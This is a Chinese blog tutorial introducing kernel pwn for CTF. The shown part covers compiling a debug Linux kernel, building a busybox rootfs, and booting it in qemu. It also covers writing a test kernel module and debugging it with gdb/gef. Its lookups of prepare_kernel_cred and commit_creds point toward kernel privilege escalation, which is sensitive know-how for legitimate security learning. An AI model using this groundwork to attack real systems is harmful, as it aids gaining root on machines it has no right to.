<!DOCTYPE html>


<html lang="zh-CN">


<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="CTF, pwn, kernel,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
   
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    Kernel pwn CTF 入门 |  Kiprey&#39;s Blog
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  
<link rel="stylesheet" href="/css/custom.css">

  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  
<script>
var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();
</script>


<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
</head>

</html>

<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-kernel_pwn_introduction"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  Kernel pwn CTF 入门
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2021/10/kernel_pwn_introduction/" class="article-date">
  <time datetime="2021-10-02T05:39:22.000Z" itemprop="datePublished">2021-10-02</time>
</a>   
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">15.2k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">69 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="一、简介">一、简介</h2>
<p>内核 CTF 入门，主要参考 <a href="https://wiki.x10sec.org/pwn/linux/kernel-mode/environment/readme/" target="_blank" rel="noopener">CTF-Wiki</a>。</p>
<a id="more"></a>
<h2 id="二、环境配置">二、环境配置</h2>
<ul>
<li>
<p>调试内核需要一个优秀的 gdb 插件，这里选用 gef。</p>
<blockquote>
<p>根据其他师傅描述，peda 和 pwndbg 在调试内核时会有很多玄学问题。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install capstone unicorn keystone-engine ropper</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">source</span> `<span class="built_in">pwd</span>`/gef/gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>去<a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" target="_blank" rel="noopener">清华源</a>下载 Linux kernel 压缩包并解压：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.9.8.tar.xz</span><br><span class="line">unxz linux-5.9.8.tar.xz</span><br><span class="line">tar -xf linux-5.9.8.tar</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>进入项目文件夹，进行 makefile 配置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.9.8</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<p>在其中勾选</p>
<ul>
<li><code>Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Compile the kernel with debug info</code></li>
<li><code>Kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger</code></li>
</ul>
<p>之后保存配置并退出</p>
</li>
<li>
<p>开始编译内核（默认 32 位）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j 8 bzImage</span><br></pre></td></tr></table></figure>
<blockquote>
<p>不推荐直接 <code>make -j 8</code>，因为它会编译很多很多大概率用不上的东西。</p>
</blockquote>
<p>这里有些小坑：</p>
<ul>
<li>
<p>缺失依赖项。</p>
<p>解决方法：根据 make 的报错信息来安装依赖项。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libelf-dev</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>make[1]: *** No rule to make target 'debian/certs/debian-uefi-certs.pem', needed by 'certs/x509_certificate_list'.  Stop.</code></p>
<p>解决方法：将 <code>.config</code> 中的 <code>CONFIG_SYSTEM_TRUSTED_KEYS</code> 内容置空，然后重新 make。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Certificates for signature checking</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">CONFIG_SYSTEM_TRUSTED_KEYS=<span class="string">""</span> <span class="comment"># 置空, 不要删除当前条目</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>等出现了以下信息后则编译完成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Setup is 15420 bytes (padded to 15872 bytes).</span><br><span class="line">System is 5520 kB</span><br><span class="line">CRC 70701790</span><br><span class="line">Kernel: arch&#x2F;x86&#x2F;boot&#x2F;bzImage is ready  (#2)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最后在启动内核前，先构建一个文件系统，否则内核会因为没有文件系统而报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)</span><br></pre></td></tr></table></figure>
<p>首先下载一下 busybox 源代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.34.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.34.1.tar.bz2</span><br></pre></td></tr></table></figure>
<p>之后配置 makefile：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> busybox-1.34.1</span><br><span class="line">make menuconfig</span><br><span class="line">make -j 8</span><br></pre></td></tr></table></figure>
<p>在 menuconfig 页面中，</p>
<ul>
<li>
<p>Setttings 选中 Build static binary (no shared libs), 使其编译成静态链接的文件（因为 kernel 不提供 libc)</p>
<p>需要注意的是，静态编译与链接需要额外安装一个依赖项 <code>glibc-static</code>。使用以下命令安装：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># redhat/centos系列安装:</span></span><br><span class="line">sudo yum install glibc-static</span><br><span class="line"><span class="comment"># debian/ubuntu系列安装</span></span><br><span class="line">sudo apt-get install libc6-dev</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在 Linux System Utilities 中取消选中 Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)</p>
<blockquote>
<p>当前版本默认没有选中该项，因此可以跳过。</p>
</blockquote>
</li>
</ul>
<p>编译完成后，使用 <code>make install</code>命令，将生成文件夹<code>_install</code>，该目录将成为我们的 rootfs。</p>
<p>接下来在 <code>_install</code> 文件夹下执行以创建一系列文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>
<p>之后，在 rootfs 下（即 <code>_install</code> 文件夹下）编写以下 init 挂载脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"INIT SCRIPT"</span></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"Boot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds"</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
<p>最后设置 init 脚本的权限，并将 rootfs 打包：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./init</span><br><span class="line"><span class="comment"># 打包命令</span></span><br><span class="line">find . | cpio -o --format=newc &gt; ../../rootfs.img</span><br><span class="line"><span class="comment"># 解包命令</span></span><br><span class="line"><span class="comment"># cpio -idmv &lt; rootfs.img</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>busybox的编译与安装在构建 rootfs 中不是必须的，但还是强烈建议构建 busybox，因为它提供了非常多的有用工具来辅助使用 kernel。</p>
</blockquote>
</li>
<li>
<p>使用 qemu 启动内核。以下是 CTF wiki 推荐的启动参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr"</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>
<p>本着减少参数设置的目的，这是笔者的启动参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">  -initrd ./rootfs.img \</span><br><span class="line">  -append <span class="string">"nokaslr"</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>减少启动的参数个数，可以让我们在入门时，暂时屏蔽掉一些不必要的细节。</p>
<p>这里只设置了三个参数，其中：</p>
<ul>
<li>
<p><code>-kernel</code> 指定内核镜像文件 bzImage 路径</p>
</li>
<li>
<p><code>-initrd</code> 设置内核启动的内存文件系统</p>
</li>
<li>
<p><code>-append &quot;nokaslr&quot;</code> 关闭 Kernel ALSR 以便于调试内核</p>
<p>注意：<code>nokaslr</code> 可 <strong>千万千万千万别打成 <code>nokalsr</code></strong> 了。就因为这个我调试了一个下午的 kernel…</p>
<p>是的 CTF Wiki 上的 nokaslr 也是错的，它打成了 nokalsr （xs）</p>
</li>
</ul>
</blockquote>
<p>启动好后就可以使用内置的 shell 了。</p>
</li>
</ul>
<h2 id="三、内核驱动的编写与调试">三、内核驱动的编写与调试</h2>
<h3 id="1-构建过程">1. 构建过程</h3>
<p>这里我们在 linux kernel 项目包下新建了一个文件夹：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux-5.9.8 $ mkdir mydrivers</span><br></pre></td></tr></table></figure>
<p>之后在该文件夹下放入一个驱动代码<code>ko_test.c</code>，代码照搬的 CTF-wiki：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ko_test_init</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">"This is a test ko!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ko_test_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">"Bye Bye~\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure>
<p>代码编写完成后，放入一个 <code>Makefile</code>文件：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定声称哪些 内核模块</span></span><br><span class="line">obj-m += ko_test.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定内核项目路径</span></span><br><span class="line">KDIR =/usr/class/kernel_pwn/linux-5.9.8</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">        <span class="comment"># -C 参数指定进入内核项目路径</span></span><br><span class="line">        <span class="comment"># -M 指定驱动源码的环境，使 Makefile 在构建模块之前返回到 驱动源码 目录，并在该目录中生成驱动模块</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意点：</p>
<ol>
<li>
<p>Makefile 文件名中的首字母 <code>M</code> 一定是大写，否则会报以下错误：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scripts/Makefile.build:44: /usr/class/kernel_pwn/linux-5.9.8/mydrivers/Makefile: No such file or directory</span><br><span class="line">make[2]: *** No rule to make target <span class="string">'/usr/class/kernel_pwn/linux-5.9.8/mydrivers/Makefile'</span>.  Stop.</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Makefile 中 <code>obj-m</code> 要与刚刚的驱动代码文件名所对应，否则会报以下错误：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make[2]: *** No rule to make target <span class="string">'/usr/class/kernel_pwn/linux-5.9.8/mydrivers/ko_test.o'</span>, needed by <span class="string">'/usr/class/kernel_pwn/linux-5.9.8/mydrivers/ko_test.mod'</span>.  Stop.</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>如果make时遇到以下错误：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">makefile:6: *** missing separator.  Stop.</span><br></pre></td></tr></table></figure>
<p>则使用 vim 打开 Makefile，键入 <code>i</code> 以进入输入模式，然后替换掉 make 命令前的前导空格为 tab，最后键入 <code>:wq</code> 保存修改。</p>
</li>
</ol>
</blockquote>
<p>最后使用 <code>make</code> 即可编译驱动。完成后的目录内容如下所示：</p>
<blockquote>
<p>这里我们只关注 <code>ko_test.ko</code>。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ tree                  </span><br><span class="line">.</span><br><span class="line">├── ko_test.c</span><br><span class="line">├── ko_test.ko</span><br><span class="line">├── ko_test.mod</span><br><span class="line">├── ko_test.mod.c</span><br><span class="line">├── ko_test.mod.o</span><br><span class="line">├── ko_test.o</span><br><span class="line">├── Makefile</span><br><span class="line">├── modules.order</span><br><span class="line">└── Module.symvers</span><br><span class="line"></span><br><span class="line">0 directories, 9 files</span><br></pre></td></tr></table></figure>
<h3 id="2-运行过程">2. 运行过程</h3>
<p>将新编译出来的 <code>*.ko</code> 文件复制进 rootfs 文件夹（<code>busybox-1.34.1/_install</code>）下，</p>
<p>之后修改 <code>busybox-1.34.1/_install/init</code> 脚本中的内容：</p>
<blockquote>
<p>这里需要提权 /bin/sh， 目的是为了使用 root 权限启动 /bin/sh，使得拥有执行 <code>dmesg</code> 命令的权限。</p>
</blockquote>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo "INIT SCRIPT"</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="addition">+ insmod /ko_test.ko # 挂载内核模块</span></span><br><span class="line">echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"</span><br><span class="line"><span class="deletion">- setsid /bin/cttyhack setuidgid 1000 /bin/sh</span></span><br><span class="line"><span class="addition">+ setsid /bin/cttyhack setuidgid 0 /bin/sh # 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span><br><span class="line"><span class="addition">+ poweroff -f # 设置 shell 退出后则关闭机器</span></span><br></pre></td></tr></table></figure>
<p>重新打包 rootfs 并运行 qemu，之后键入 <code>dmesg</code> 命令即可看到 ko_test 模块已被成功加载：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211002133722875.png" alt="image-20211002133722875"></p>
<blockquote>
<p>正常情况下，执行 qemu 会弹出一个小框 GUI。若想像上图一样将启动的界面变成当前终端，则需在 qemu 启动时额外指定参数：</p>
<ul>
<li><code>-nographic</code></li>
<li><code>-append &quot;console=ttyS0&quot;</code></li>
</ul>
</blockquote>
<h3 id="3-调试过程">3. 调试过程</h3>
<h4 id="a-attach-qemu">a. attach qemu</h4>
<p>调试时最好使用 root 权限执行 <code>/bin/sh</code>，相关修改方法已经在上面说明，此处暂且不表。</p>
<p>在启动 qemu 时，额外指定参数 <code>-gdb tcp::1234</code> （或者等价的<code>-s</code>），之后 qemu 将做好 gdb attach 的准备。如果希望 qemu 启动后立即挂起，则必须附带 <code>-S</code> 参数。</p>
<p>同时，调试内核时，为了加载 vmlinux 符号表，<strong>必须额外指定 <code>-append &quot;nokaslr&quot;</code>以关闭 kernel ASLR</strong>。这样符号表才能正确的对应至内存中的指定位置，<strong>否则将无法给目标函数下断点</strong>。</p>
<p>qemu启动后，<strong>必须另起一个终端</strong>，键入 <code>gdb -q -ex &quot;target remote localhost:1234&quot;</code>，即可 attach 至 qemu上。</p>
<p>gdb attach 上 qemu 后，可以加载 vmlinux 符号表、给特定函数下断点，并输入 <code>continue</code> 以执行至目标函数处。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># qemu 指定 -S 参数后挂起，此时在gdb键入以下命令</span></span><br><span class="line">gef&gt; add-symbol-file vmlinux</span><br><span class="line">gef&gt; b start_kernel</span><br><span class="line">gef&gt; <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">[Breakpoint 1, start_kernel () at init/main.c:837]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>对于内核中的各个符号来说，我们也可以通过以下命令来查看一些符号在内存中的加载地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep &lt;symbol_name&gt; /proc/kalsyms</span></span><br><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br><span class="line">grep ko_test_init  /proc/kallsyms</span><br></pre></td></tr></table></figure>
<blockquote>
<p>坑点1：之前笔者编写了以下 shell 脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其他设置</span></span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># **后台** 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 [other args] &amp;</span><br><span class="line"><span class="comment"># 直接在当前终端打开 GDB</span></span><br><span class="line">gdb -q -ex <span class="string">"target remote localhost:1234"</span></span><br></pre></td></tr></table></figure>
<p>但在执行脚本时，当笔者在 GDB 中键入 Ctrl+C 时， SIGINT 信号将直接终止 qemu 而不是挂起内部的 kernel。因此，gdb必须在另一个终端启动才可以正常处理 Ctrl+C。</p>
<p>正确的脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其他设置</span></span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># **后台** 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 [other args] &amp;</span><br><span class="line"><span class="comment"># 开启新终端，在新终端中打开 GDB</span></span><br><span class="line">gnome-terminal -e <span class="string">'gdb -q -ex "target remote localhost:1234"'</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>坑点2：对于 gdb gef 插件来说，最好不要使用常规的<code>target remote localhost:1234</code>语句（无需root权限）来连接远程，否则会报以下错误：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  target remote localhost:1234</span><br><span class="line">Remote debugging using localhost:1234</span><br><span class="line">warning: No executable has been specified and target does not support</span><br><span class="line">determining executable automatically.  Try using the <span class="string">"file"</span> <span class="built_in">command</span>.</span><br><span class="line">0x000000000000fff0 <span class="keyword">in</span> ?? ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">──────────────────────────────────── registers ────────────────────────────────────</span><br><span class="line">[!] Command <span class="string">'context'</span> failed to execute properly, reason: <span class="string">'NoneType'</span> object has no attribute <span class="string">'all_registers'</span></span><br></pre></td></tr></table></figure>
<p>与之相对的，使用效果更好的 <code>gef-remote</code> 命令（需要root权限）连接 qemu：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一定要提前指定架构</span></span><br><span class="line"><span class="built_in">set</span> architecture i386:x86-64</span><br><span class="line">gef-remote --qemu-mode localhost:1234</span><br></pre></td></tr></table></figure>
<p>坑点3：如果 qemu 断在 <code>start_kernel</code>时 gef 报错：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!] Command <span class="string">'context'</span> failed to execute properly, reason: max() arg is an empty sequence</span><br></pre></td></tr></table></figure>
<p>直接单步 <code>ni</code> 一下即可。</p>
</blockquote>
<h4 id="b-attach-drivers">b. attach drivers</h4>
<h5 id="1-常规步骤">1) 常规步骤</h5>
<p>首先， 将目标驱动加载进内核中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod &lt;driver_module_name&gt;</span><br></pre></td></tr></table></figure>
<p>之后，通过以下命令查看 qemu 中内核驱动的 text 段的装载基地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看装载驱动</span></span><br><span class="line">lsmod</span><br><span class="line"><span class="comment"># 获取驱动加载的基地址</span></span><br><span class="line">grep &lt;target_module_name&gt; /proc/modules</span><br></pre></td></tr></table></figure>
<p>在 gdb 窗口中，键入 以下命令以加载调试符号：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file mydrivers/ko_test.ko &lt;ko_test_base_addr&gt; [-s &lt;section1_name&gt; &lt;section1_addr&gt;] ...</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注，与 vmlinux 不同，使用 add-symbol-file 加载内核模块符号时，<strong>必须指定内核模块的 text 段基地址</strong>。</p>
<p>因为内核位于众所周知的虚拟地址（该地址与 vmlinux elf 文件的加载地址相同），但内核模块只是一个存档，不存在有效加载地址，只能等到内核加载器分配内存并决定在哪里加载此模块的每个可加载部分。因此在加载内核模块前，我们无法得知内核模块将会加载到哪块内存上。故将符号文件加载进 gdb 时，我们必须尽可能显式指定每个 section 的地址。</p>
<p>需要注意的是，<strong>加载符号文件时，越多指定每个 section 的地址越好</strong>。否则如果只单独指定了 .text 段的基地址，则有可能在给函数下断点时断不下来，非常影响调试。</p>
</blockquote>
<p>如何查看目标内核模块的各个 section 加载首地址呢？请执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">"0x"</span> /sys/module/ko_test/sections/.*</span><br></pre></td></tr></table></figure>
<h5 id="2-例子">2) 例子</h5>
<p>一个小小例子：调试 ko_test.ko 的步骤如下：</p>
<ul>
<li>
<p>首先在 qemu 中的 kernel shell 执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先装载 ko_test 进内核中</span></span><br><span class="line">insmod /ko_test.ko</span><br><span class="line"><span class="comment"># 查看当前 ko_test 装载的地址</span></span><br><span class="line">grep ko_test /proc/modules</span><br><span class="line">grep <span class="string">"0x"</span> /sys/module/ko_test/sections/.*</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003135526278.png" alt="image-20211003135526278"></p>
</li>
<li>
<p>记录下这些地址，之后进入 gdb 中，先按下 Ctrl+C 断下 kernel，然后键入以下命令：</p>
